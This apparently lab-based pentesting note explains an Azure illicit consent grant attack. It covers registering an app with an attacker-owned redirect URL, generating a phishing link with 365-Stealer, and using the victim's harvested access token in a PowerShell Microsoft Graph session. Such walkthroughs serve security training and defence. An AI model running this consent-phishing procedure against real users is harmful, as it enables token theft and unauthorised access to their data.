---
title: Illicit Consent Grant
source_url: https://notes.incendium.rocks/pentesting-notes/cloud/azure/privilege-escalation/illicit-consent-grant
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: cloud
---

When we have initial access to a user, we can create a application (this is a default setting).

A recommendation is to deny users to create applications

With this application we can ask another user to consent their permissions to our application. When the user consents, we get their access token. With this access token we can interact with perhaps the Graph API.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FP3Ee4rd1dg1UG9SO6qqd%2Fimage.png?alt=media&amp;token=d0e5ed04-04ca-4016-9992-964ccc541e90" alt=""><figcaption><p>Illicit Consent Grant attack explained</p></figcaption></figure>

### Attack

We first go to <https://portal.azure.com> and register a application from our initial access user. We should use a url that we own as redirect url. So for example <https://172.16.10.10/login/authorized>. For the permissions, we add User.ReadBasic.All:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FTYhoNL6HFHJ2BxgZKJmD%2Fimage.png?alt=media&amp;token=f8b85214-a219-441c-9654-2be1e88d2a20" alt=""><figcaption></figcaption></figure>

Next, we spin up a tool called 365-stealer. Which is a tool created by Altered Security to give a GUI to manage our phishing attack. <https://github.com/AlteredSecurity/365-Stealer>. This tool allows us to fill in the app's information:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FYoSfyBK7JRb0duTIGdAo%2Fimage.png?alt=media&amp;token=a985e4ad-6e21-429e-9a37-324adb8e4561" alt=""><figcaption></figcaption></figure>

If we save and run the attack, a shell pops up with a phishing link:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2F0BI0BMrIUZ7DfUjhiTT4%2Fimage.png?alt=media&amp;token=86d39aa0-3d82-4510-bb1d-a233d84e91f4" alt=""><figcaption></figcaption></figure>

We sent this link to the victim. If the victim consents to our application, we receive a update on the GUI:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FjzzrYmHHM90rAt7QxgP6%2Fimage.png?alt=media&amp;token=8044904a-95f3-45a9-b6b1-dad088a15582" alt=""><figcaption></figcaption></figure>

We can copy the access\_token and use that to connect to Microsoft Graph.

```powershell
PS C:\Windows\system32> $token = 'eY.....'
PS C:\Windows\system32> Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
Welcome to Microsoft Graph!

Connected via userprovidedaccesstoken access using bd46fc07-1626-43be-80b7-fkfkfkf
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.

PS C:\Windows\system32> Get-MgContext

ClientId               : bd46fc07-1626-43be-80b7fgfgfgfgff
TenantId               : 2d50cb29-5f7b-48a4-87ceffgffgfgfg
Scopes                 : {User.Read, User.ReadBasic.All, profile, openid...}
AuthType               : UserProvidedAccessToken
TokenCredentialType    : UserProvidedAccessToken
CertificateThumbprint  :
CertificateSubjectName :
SendCertificateChain   : False
Account                : x@pp.onmicrosoft.com
AppName                : student60
ContextScope           : Process
Certificate            :
PSHostVersion          : 5.1.17763.1490
ManagedIdentityId      :
ClientSecret           :
Environment            : Global
```
